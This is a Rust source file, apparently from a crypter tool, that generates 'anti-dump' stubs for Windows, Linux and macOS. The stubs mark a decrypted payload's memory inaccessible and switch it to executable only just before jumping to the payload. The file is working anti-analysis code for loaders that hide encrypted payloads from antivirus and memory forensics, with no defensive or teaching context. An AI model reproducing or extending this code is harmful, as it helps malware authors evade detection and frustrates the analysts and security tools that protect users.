//! Emit anti-dump helpers. After decrypt, the payload region is
//! mprotect'd to NOACCESS. Immediately before calling the payload's
//! entry, re-protect to EXECUTE_READ.

use crypter_ir::TargetOs;

pub fn emit_antidump_fn(name: &str, target: TargetOs) -> String {
    let mut s = format!("mod {} {{\n", name);
    s.push_str("    use super::*;\n\n");

    match target {
        TargetOs::Windows => {
            s.push_str(r#"    pub struct Guard {
        ptr: *mut u8,
        len: usize,
        old: u32,
    }

    pub fn protect(data: &[u8]) -> Guard {
        #[cfg(target_os = "windows")]
        unsafe {
            let ptr = data.as_ptr() as *mut u8;
            let len = data.len();
            let mut old: u32 = 0;
            let ok = VirtualProtect(ptr as *mut c_void, len, PAGE_NOACCESS, &mut old);
            if ok == 0 {
                return Guard { ptr, len, old: PAGE_READWRITE };
            }
            return Guard { ptr, len, old };
        }
        #[cfg(not(target_os = "windows"))]
        {
            Guard { ptr: data.as_ptr() as *mut u8, len: data.len(), old: 0 }
        }
    }

    pub fn unprotect(g: &Guard) {
        #[cfg(target_os = "windows")]
        unsafe {
            let mut old: u32 = 0;
            let _ = VirtualProtect(g.ptr as *mut c_void, g.len, PAGE_EXECUTE_READ, &mut old);
        }
    }
"#);
        }
        TargetOs::Linux | TargetOs::Macos => {
            s.push_str(r#"    pub struct Guard {
        ptr: *mut u8,
        len: usize,
    }

    pub fn protect(data: &[u8]) -> Guard {
        unsafe {
            let ptr = data.as_ptr() as *mut u8;
            let len = data.len();
            // round to page size
            let page = 4096;
            let start = (ptr as usize) & !(page - 1);
            let end = ((ptr as usize + len) + page - 1) & !(page - 1);
            let size = end - start;
            let _ = mprotect(start as *mut c_void, size, PROT_NONE);
            Guard { ptr, len }
        }
    }

    pub fn unprotect(g: &Guard) {
        unsafe {
            let page = 4096;
            let start = (g.ptr as usize) & !(page - 1);
            let end = ((g.ptr as usize + g.len) + page - 1) & !(page - 1);
            let size = end - start;
            let _ = mprotect(start as *mut c_void, size, PROT_READ | PROT_EXEC);
        }
    }

    extern "C" {
        fn mprotect(addr: *mut c_void, len: usize, prot: i32) -> i32;
    }
    const PROT_NONE: i32 = 0;
    const PROT_READ: i32 = 1;
    const PROT_EXEC: i32 = 4;
"#);
        }
    }

    s.push_str("}\n\n");

    // Windows helpers
    if matches!(target, TargetOs::Windows) {
        s.push_str(r#"#[cfg(target_os = "windows")]
extern "system" {
    fn VirtualProtect(addr: *mut c_void, size: usize, new: u32, old: *mut u32) -> i32;
}
#[cfg(target_os = "windows")]
const PAGE_NOACCESS: u32 = 0x01;
#[cfg(target_os = "windows")]
const PAGE_READWRITE: u32 = 0x04;
#[cfg(target_os = "windows")]
const PAGE_EXECUTE_READ: u32 = 0x20;

"#);
    }

    s
}
